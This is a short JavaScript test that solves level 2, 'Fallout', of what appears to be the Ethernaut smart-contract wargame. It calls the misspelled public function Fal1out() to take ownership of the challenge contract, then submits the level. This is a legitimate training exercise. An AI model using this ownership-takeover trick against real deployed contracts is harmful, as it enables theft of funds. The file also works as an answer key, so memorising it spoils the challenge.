const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Fallout");
  const challengeAddress = await createChallenge(`0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 2-Fallout", async function () {
  const challenge = await getChallenge();

  tx = await challenge.Fal1out();
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
